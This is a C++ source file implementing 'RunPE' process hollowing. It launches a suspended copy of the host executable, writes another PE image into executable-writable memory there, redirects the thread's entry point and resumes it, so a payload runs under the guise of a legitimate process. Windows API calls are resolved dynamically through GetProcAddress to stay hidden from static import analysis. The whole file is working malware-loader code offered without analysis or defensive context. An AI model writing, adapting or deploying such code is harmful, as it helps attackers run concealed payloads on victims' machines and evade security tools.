#include "runpe.h"

void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
    PVOID pImage = static_cast<PVOID>(Image.data());

    auto DosHeader = PIMAGE_DOS_HEADER{};
    auto NtHeaders = PIMAGE_NT_HEADERS64{};
    auto SectionHeader = PIMAGE_SECTION_HEADER{};

    auto si = STARTUPINFOA{};
    memset(&si, 0, sizeof(si));

    auto pi = PROCESS_INFORMATION{};
    memset(&pi, 0, sizeof(pi));

    char FilePath[256];
    reinterpret_cast<decltype(&GetModuleFileNameA)>(RpGetProcAddress("kernel32.dll", "GetModuleFileNameA"))
        (nullptr, FilePath, MAX_PATH);

    DosHeader = PIMAGE_DOS_HEADER(pImage);
    NtHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew);

    if (NtHeaders->Signature == IMAGE_NT_SIGNATURE) {

        if (reinterpret_cast<decltype(&CreateProcessA)>(RpGetProcAddress("kernel32.dll", "CreateProcessA"))
            (FilePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi)) {

            auto ctx = PCONTEXT{};
            ctx = LPCONTEXT(reinterpret_cast<decltype(&VirtualAlloc)>(RpGetProcAddress("kernel32.dll", "VirtualAlloc"))
                (0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));

            ctx->ContextFlags = CONTEXT_FULL;

            if (reinterpret_cast<decltype(&GetThreadContext)>(RpGetProcAddress("kernel32.dll", "GetThreadContext"))
                (pi.hThread, LPCONTEXT(ctx))) {

                auto ImageBase = reinterpret_cast<decltype(&VirtualAllocEx)>(RpGetProcAddress("kernel32.dll", "VirtualAllocEx"))
                    (pi.hProcess, LPVOID(NtHeaders->OptionalHeader.ImageBase), NtHeaders->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
                    (pi.hProcess, ImageBase, pImage, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);

                for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {

                    SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew + 264 + (i * 40));

                    reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
                        (pi.hProcess, LPVOID(ULONGLONG(ImageBase) + SectionHeader->VirtualAddress),
                            LPVOID(ULONGLONG(pImage) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData, NULL
                            );

                    reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
                        (pi.hProcess, LPVOID(ctx->Rdx + 0x10),
                            LPVOID(&NtHeaders->OptionalHeader.ImageBase),
                            8, NULL
                            );
                }

                ctx->Rcx = ULONGLONG(ImageBase) + NtHeaders->OptionalHeader.AddressOfEntryPoint;
                reinterpret_cast<decltype(&SetThreadContext)>(RpGetProcAddress("kernel32.dll", "SetThreadContext"))
                    (pi.hThread, LPCONTEXT(ctx));

                reinterpret_cast<decltype(&ResumeThread)>(RpGetProcAddress("kernel32.dll", "ResumeThread"))
                    (pi.hThread);

                reinterpret_cast<decltype(&WaitForSingleObject)>(RpGetProcAddress("kernel32.dll", "WaitForSingleObject"))
                    (pi.hProcess, 0);
            }
        }
    }
}

PVOID RunPE::RpGetProcAddress(const char* Mod, const char* Proc) {
    auto Module = GetModuleHandleA(Mod);
    if (Module) {
        return GetProcAddress(Module, Proc);
    }
    else {
        Module = LoadLibraryA(Mod);
        return Module ? GetProcAddress(Module, Proc) : nullptr;
    }
}

